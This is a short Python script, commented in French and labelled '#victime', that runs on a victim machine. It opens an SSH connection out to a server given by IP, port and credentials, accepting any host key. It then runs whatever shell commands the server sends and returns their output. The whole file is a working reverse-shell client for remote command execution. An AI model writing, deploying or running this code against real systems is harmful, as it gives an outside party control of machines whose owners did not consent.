
#victime
import paramiko
import subprocess # exécuter des commandes système
import getpass


#Connexion SSH vers un serveur
def ssh_command(ip, port, user, passwd):
    # creer un client ssh et ignore la vérification des clés
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connexion au serveur ssh
    client.connect(ip, port=int(port), username=user, password=passwd)
    # ouvre une session ssh
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send("ClientConnected") # au serveur

        while True:
            command = ssh_session.recv(1024).decode() #Réception de commande

            if command.strip() == 'exit':
                client.close()
                break

            try:  # Exécution de la commande sur la machine local
                cmd_output = subprocess.check_output(
                    command,
                    stderr=subprocess.STDOUT,
                    shell=True
                )
                # Envoi du résultat au serveur
                ssh_session.send(cmd_output if cmd_output else b"ok")

            except Exception as e:
                ssh_session.send(str(e).encode())

    client.close()


if __name__ == '__main__':
    user = input("Username: ")
    password = getpass.getpass("Password: ")
    ip = input("Server IP: ")
    port = input("Port: ")
    ssh_command(ip, port, user, password)